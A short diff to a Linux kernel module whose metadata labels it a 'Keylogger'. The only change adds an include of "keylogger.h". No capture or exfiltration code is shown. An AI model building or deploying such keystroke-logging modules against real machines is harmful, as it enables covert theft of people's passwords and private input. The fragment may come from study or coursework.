@@ -11,6 +11,7 @@
 #include <linux/vmalloc.h>
 #include <linux/interrupt.h>
 #include <asm/io.h>
+#include "keylogger.h"
 
 MODULE_AUTHOR("hsmits & sel-melc");
 MODULE_DESCRIPTION("Keylogger");
